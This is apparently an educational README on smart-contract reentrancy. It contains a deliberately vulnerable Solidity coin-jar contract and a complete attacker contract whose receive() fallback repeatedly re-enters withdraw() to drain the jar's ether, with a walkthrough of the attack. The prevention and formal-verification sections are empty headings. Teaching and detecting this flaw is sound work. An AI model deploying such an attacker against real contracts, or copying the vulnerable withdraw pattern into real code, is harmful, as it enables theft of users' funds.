# Demonstrating the reentrancy vulnerability of smart contracts

The objective of this project is two folds.
The one is to demonstrate the reentrancy vulnerability of smart contract, and the second is to systematically detect a potential vulnerability of a solidity code through formal verification.
The solidity compiler solc has already equipped rich formal verification features due to model checkers and SMT solvers, but in order to carry out it for the reentrancy issue, a programmer has to be aware of such potential problems and explicitly put assertions in a source code, that surely requires skills for secure programming.  For this project, we don't suppose that programmers have such skills, and I am going to offer a prototypical solution for them, so that they get a warning of a presence of potential reentrancy vulnerability in their code wihtout any prerequisite secure programming knowdledge.

The rest of this document is organized as follows.  We first review what the reentrancy problem is.  Then secondly, we are going to see a running example of a vulnerable contract and an attacker contract.  Thirdly, we see a couple of security tips to prevent the problem, and forthly, we apply formal verification to find that our contract is indeed vulnerable, where we also go through a minimal background of formal verification.

The full source codes for this project is published on github.

# Reentrancy

The reentrancy is a cause of security problem which leads to a massive finnancial loss.
As the name suggests, this is due to reentrance of the execution into a function.  Let's take a look at a running example of a vulnerable solidity code.

## Vulnerable smart contract: Coin jar

The following code is a simple smart contract implmenting a coin jar.
```
// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.6.12 <0.9.0;

contract Jar {

    mapping(address=>uint) public balance;

    constructor() payable {

    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] != 0, "zero balance");
        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
        require(s, "In Jar.withdrow(), call() failed.");
        balance[msg.sender] = 0;
    }
}
```
It has two external functions, <code>deposit</code> and <code>withdraw</code>, which are respectively to deposit crypto currency to this jar contract and to withdraw one's deposit.  The state variable <code>balance</code> records which contract address has how much deposit, and it is increased as a deposit is made via the <code>deposit</code> function.  The function <code>withdraw</code> is used to withdraw all the asset which one has deposited so far.  It first checks that the balance is non-zero, send the deposit to the original asset owner (i.e. <code>msg.sender</code>), and then in case of the transfer is successful the balance is reset to zero.

This smart contract has a security problem due to the use of the <code>call</code> function.  Alrhough the call message is the null string (i.e. <code>""</code>), this invokes a payable function in case <code>msg.sender</code> is a smart contract, and the content of the payable function is in general unkonwn and hence arbitrary.

We are going to see that we can create a malicious contract which can steal money from the Jar contract by repeatedly calling the <code>withdraw</code> function of the Jar contract; that is why this vulnerability is called reentrancy.

# Attacking a vulnerable contract
The following smart contract is a successful attacker.
```
// SPDX-License-Identifier: CC-BY-4.0
pragma solidity >=0.6.12 <0.9.0;

interface IJar {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    IJar public jar;
    address public owner;

    constructor(address _jar) payable {
        jar = IJar(_jar);
        owner = msg.sender;
    }

    function deposit() public {
        jar.deposit{ value: 1 ether }();
    }

    function attack() public {
        jar.withdraw();
    }

    receive() external payable {
        if (address(jar).balance >= 1 ether) {
            jar.withdraw();
        }
    }

    function withdraw() public {
        require (msg.sender == owner);
        (bool s, ) = owner.call{ value: address(this).balance}("");
        require (s);
    }
}
```
The definition of <code>IJar</code> stands for the interface to <code>Jar</code>.  This <code>Attacker</code> contract should be deployed with an argument the address of the target contract.  By <code>deposit</code>, this attacker contract makes a deposit in the target <code>Jar</code> contract.  Assuming we have made 1 ether of deposit, the <code>attack</code> funtion starts the main business of this attacker contract.  It calls <code>withdraw</code> function of the <code>Jar</code>, then the <code>Jar</code> contract sends 1 ether, the exact deposit amount, to the <code>Attacker</code> contract by means of the <code>call</code> function.  This <code>call</code> function invokes the <code>receive</code> function of the attacker contract, which again withdraw money from the <code>Jar</code> contract as long as the <code>Jar</code> contract owns at least 1 ether.  Reentering the <code>withdraw</code> function of the <code>Jar</code> contract, the balance of the attacker is still 1 ether, and hence it sends 1 ether to the attacker.  This process goes on until the asset of <code>Jar</code> subseeds 1 ether, namely, <code>Jar</code> loses nearly all its asset.

The following diagram illustrates the scenario.

![reentrancy](https://github.com/miyamok/reentrancy/assets/58558301/30b364fb-612b-4a9e-aeb1-bdc484f2db43)

# Secure programming to prevent reentrancy


# Formal verification
